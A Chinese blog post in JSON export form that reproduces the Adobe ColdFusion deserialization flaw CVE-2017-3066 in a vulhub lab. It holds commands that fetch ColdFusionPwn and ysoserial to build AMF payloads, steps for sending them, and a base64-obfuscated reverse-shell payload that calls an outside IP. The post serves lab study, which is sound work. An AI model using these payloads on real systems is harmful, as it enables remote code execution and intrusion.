{"title":"Adobe ColdFusion 反序列化漏洞 (CVE-2017-3066)漏洞复现","uid":"9bf8f015d45821d6b638f52155e8a097","slug":"Adobe ColdFusion 反序列化漏洞 (CVE-2017-3066)漏洞复现","date":"2023-09-26T01:07:32.388Z","updated":"2023-10-09T01:07:11.393Z","comments":true,"path":"api/articles/Adobe ColdFusion 反序列化漏洞 (CVE-2017-3066)漏洞复现.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-l8weeq.jpg","content":"<h3 id=\"漏洞介绍\"><a href=\"#漏洞介绍\" class=\"headerlink\" title=\"漏洞介绍\"></a>漏洞介绍</h3><h4 id=\"产品介绍\"><a href=\"#产品介绍\" class=\"headerlink\" title=\"产品介绍\"></a>产品介绍</h4><p>Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。</p>\n<p>Adobe ColdFusion 是一个全面且功能强大的服务器端应用程序开发语言和平台。它适用于快速开发、跨平台的 Web 应用程序，并提供了丰富的工具和库来简化开发过程</p>\n<p>Adobe ColdFusion中存在java反序列化漏洞。攻击者可利用该漏洞在受影响应用程序的上下文中执行任意代码或造成拒绝服务。以下版本受到影响：Adobe ColdFusion (2016 release) Update 3及之前的版本，ColdFusion 11 Update 11及之前的版本，ColdFusion 10 Update 22及之前的版本。</p>\n<p>Adobe ColdFusion 主要应用于以下几个方面：</p>\n<ul>\n<li>网站开发</li>\n<li>企业应用程序</li>\n<li>数据驱动的应用程序</li>\n<li>Web 服务和 API</li>\n<li>快速原型开发</li>\n</ul>\n<p>产品官网</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://helpx.adobe.com/cn/coldfusion/get-started.html\">https://helpx.adobe.com/cn/coldfusion/get-started.html</a></p></blockquote>\n<h4 id=\"鹰图语法\"><a href=\"#鹰图语法\" class=\"headerlink\" title=\"鹰图语法\"></a>鹰图语法</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">app.name&#x3D;&#x3D;&quot;Adobe ColdFusion&quot;</code></pre>\n\n<h4 id=\"高危历史漏洞\"><a href=\"#高危历史漏洞\" class=\"headerlink\" title=\"高危历史漏洞\"></a>高危历史漏洞</h4><pre class=\"line-numbers language-none\"><code class=\"language-none\">CVE-2023-38204，CVE-2023-38203，CVE-2023-29300，CVE-2023-26360，CVE-2022-35712，CVE-2022-35690，CVE-2020-3794，CVE-2019-8256，CVE-2019-8074，CVE-2019-8073，CVE-2019-7840，CVE-2019-7838，CVE-2019-7839，CVE-2019-7816，CVE-2019-7091，CVE-2018-15958，CVE-2018-15959，CVE-2018-15957，CVE-2018-15961，CVE-2018-15965，CVE-2018-4939，CVE-2017-11283，CVE-2017-11284，CVE-2017-3066，CVE-2016-1114，CVE-2013-0632</code></pre>\n\n<h4 id=\"参考链接：\"><a href=\"#参考链接：\" class=\"headerlink\" title=\"参考链接：\"></a>参考链接：</h4><ul>\n<li><a href=\"https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html\">https://codewhitesec.blogspot.com.au/2018/03/exploiting-adobe-coldfusion.html</a></li>\n<li><a href=\"https://www.exploit-db.com/exploits/43993\">https://www.exploit-db.com/exploits/43993</a></li>\n<li><a href=\"https://github.com/codewhitesec/ColdFusionPwn\">https://github.com/codewhitesec/ColdFusionPwn</a></li>\n</ul>\n<h3 id=\"环境搭建\"><a href=\"#环境搭建\" class=\"headerlink\" title=\"环境搭建\"></a>环境搭建</h3><p>这个漏洞有一个坑就是用新版本的burp大概率复现不成功（后文已解决这个问题），网上看了很多文章，终于复现成功，赶紧记录下来</p>\n<hr>\n<p>docker启环境</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cd &#x2F;vulhub&#x2F;coldfusion&#x2F;CVE-2017-3066&#x2F;\ndocker compose up -d</code></pre>\n\n<p>等待数分钟时间，环境启动成功，访问<code>http://your-ip:8500/CFIDE/administrator/index.cfm</code>，输入密码<code>vulhub</code>，即可成功安装Adobe ColdFusion</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/1693817726963-bed643a2-96ef-4795-9aaf-8b40a4c928a1.png\" alt=\"img\"></p>\n<h3 id=\"漏洞复现\"><a href=\"#漏洞复现\" class=\"headerlink\" title=\"漏洞复现\"></a>漏洞复现</h3><h4 id=\"利用postman复现\"><a href=\"#利用postman复现\" class=\"headerlink\" title=\"利用postman复现\"></a>利用postman复现</h4><p>需要利用ColdFusionPwn这个工具生成poc</p>\n<p>工具链接：<a href=\"https://github.com/codewhitesec/ColdFusionPwn\">https://github.com/codewhitesec/ColdFusionPwn</a></p>\n<p><strong>ps：测试发现只有在Linux环境下才能正常运行，Windows会报错</strong></p>\n<p>这段是vulhub上生成poc的代码</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">java -cp ColdFusionPwn-0.0.1-SNAPSHOT-all.jar:ysoserial-0.0.6-SNAPSHOT-all.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;touch &#x2F;tmp&#x2F;success&#39; poc.ser</code></pre>\n\n<p>这段是网上看的别人的执行方法，用这个比较方便</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">wget https:&#x2F;&#x2F;github.com&#x2F;codewhitesec&#x2F;ColdFusionPwn&#x2F;releases&#x2F;download&#x2F;0.0.1&#x2F;ColdFusionPwn-0.0.1-SNAPSHOT-all.jar\nmv ColdFusionPwn-0.0.1-SNAPSHOT-all.jar ColdFusionPwn.jar\n\nwget https:&#x2F;&#x2F;jitpack.io&#x2F;com&#x2F;github&#x2F;frohoff&#x2F;ysoserial&#x2F;master-SNAPSHOT&#x2F;ysoserial-master-SNAPSHOT.jar\nmv ysoserial-master-SNAPSHOT.jar ysoserial.jar\n\njava -cp ColdFusionPwn.jar:ysoserial.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;touch &#x2F;tmp&#x2F;CVE-2017-3066_is_success&#39; poc.ser</code></pre>\n\n<p>访问<code>http://your-ip:8500/flex2gateway/amf</code>，利用bp进行抓包，注意文件类型修改为<code>Content-Type: application/x-amf</code>,修改为POST请求</p>\n<p>在bp空白处右键,Paste from file ,导入刚才生成的poc.ser</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/1693822162108-01edc8b1-145c-4493-aa15-0b896db9b6c6.png\" alt=\"img\"></p>\n<p>经过测试，这样是不能执行成功的，因为新版的的burp suite的问题</p>\n<p>这里要用<strong>postman</strong></p>\n<p>postman下载地址</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p><a href=\"https://www.postman.com/downloads/\">https://www.postman.com/downloads/</a></p></blockquote>\n<p>下载完成后执行安装即可</p>\n<p>配置postman代理，将postman 流量代理到burp上</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/1693825827050-2c3d0783-9c65-4117-8d0d-8c882a3f45de.png\" alt=\"img\"></p>\n<p>按如下流程</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/1693826471604-d2e0ad1f-213b-417e-9224-b4eca890a8e2.png\" alt=\"img\"></p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/1693826441420-165803ee-f156-40bd-96db-4c72937276ac.png\" alt=\"img\"></p>\n<p>点击send</p>\n<p>这时候bp收到流量，发送即可</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/1693826573091-1b781b73-5b3a-41b4-b715-e6c778636c95.png\" alt=\"img\"></p>\n<p>返回docker查看结果</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/1693826598894-4eb67fd1-e6fe-4659-81b7-218f5a31a6bf.png\" alt=\"img\"></p>\n<p>反弹shell</p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">java -cp ColdFusionPwn.jar:ysoserial.jar com.codewhitesec.coldfusionpwn.ColdFusionPwner -e CommonsBeanutils1 &#39;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC84OS4xMTcuMTcyLjI3LzQzOTkgMD4mMQ&#x3D;&#x3D;&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#39; poc1.ser</code></pre>\n\n<p>然后重复之前步骤即可</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/1693827041075-3b53c0e4-d176-4e4a-98c7-6e1530eba184.png\" alt=\"img\"></p>\n<h4 id=\"新版burp解决办法\"><a href=\"#新版burp解决办法\" class=\"headerlink\" title=\"新版burp解决办法\"></a>新版burp解决办法</h4><p>其实burp suite也可以使用，但是需要修改默认的字符集，按照下图所示修改即可</p>\n<p><img src=\"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/1693830128612-4623a225-7771-41fd-84ac-e854aa90da85.png\" alt=\"img\"></p>\n","feature":true,"text":"漏洞介绍产品介绍Adobe ColdFusion是美国Adobe公司的一款动态Web服务器产品，其运行的CFML（ColdFusion Markup Language）是针对Web应用的一种程序设计语言。 Adobe ColdFusion 是一个全面且功能强大的服务器端应用程序开...","link":"","photos":[],"count_time":{"symbolsCount":"3k","symbolsTime":"3 mins."},"categories":[{"name":"漏洞","slug":"漏洞","count":2,"path":"api/categories/漏洞.json"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","count":2,"path":"api/tags/漏洞复现.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">漏洞介绍</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E4%BA%A7%E5%93%81%E4%BB%8B%E7%BB%8D\"><span class=\"toc-text\">产品介绍</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%B9%B0%E5%9B%BE%E8%AF%AD%E6%B3%95\"><span class=\"toc-text\">鹰图语法</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E9%AB%98%E5%8D%B1%E5%8E%86%E5%8F%B2%E6%BC%8F%E6%B4%9E\"><span class=\"toc-text\">高危历史漏洞</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%8F%82%E8%80%83%E9%93%BE%E6%8E%A5%EF%BC%9A\"><span class=\"toc-text\">参考链接：</span></a></li></ol></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA\"><span class=\"toc-text\">环境搭建</span></a></li><li class=\"toc-item toc-level-3\"><a class=\"toc-link\" href=\"#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">漏洞复现</span></a><ol class=\"toc-child\"><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E5%88%A9%E7%94%A8postman%E5%A4%8D%E7%8E%B0\"><span class=\"toc-text\">利用postman复现</span></a></li><li class=\"toc-item toc-level-4\"><a class=\"toc-link\" href=\"#%E6%96%B0%E7%89%88burp%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95\"><span class=\"toc-text\">新版burp解决办法</span></a></li></ol></li></ol>","author":{"name":"caTt0m","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"mapped":true,"prev_post":{},"next_post":{"title":"Konga Unauthorized access","uid":"e30713b944030e046fa43cdfbe8c536f","slug":"konga Unauthorized access","date":"2023-08-06T07:30:46.647Z","updated":"2023-08-20T00:33:24.164Z","comments":true,"path":"api/articles/konga Unauthorized access.json","keywords":null,"cover":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/wallhaven-7p12xv.jpg","text":"Konga Unauthorized access(CVE-2023-39846)konga introduce（konga 介绍）Kong is an API Gateway, which is distributed, high-performance, high-concu...","link":"","photos":[],"count_time":{"symbolsCount":"2.8k","symbolsTime":"3 mins."},"categories":[{"name":"漏洞","slug":"漏洞","count":2,"path":"api/categories/漏洞.json"}],"tags":[{"name":"漏洞复现","slug":"漏洞复现","count":2,"path":"api/tags/漏洞复现.json"}],"author":{"name":"caTt0m","slug":"blog-author","avatar":"https://abyssaler-typora-photobank.oss-cn-chengdu.aliyuncs.com/img_for_typora/Face.jpg","link":"/","description":"道阻且长，行则将至","socials":{"github":"https://github.com/Abyssaler","twitter":"","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"https://blog.csdn.net/weixin_45349299","juejin":"","customs":{}}},"feature":true}}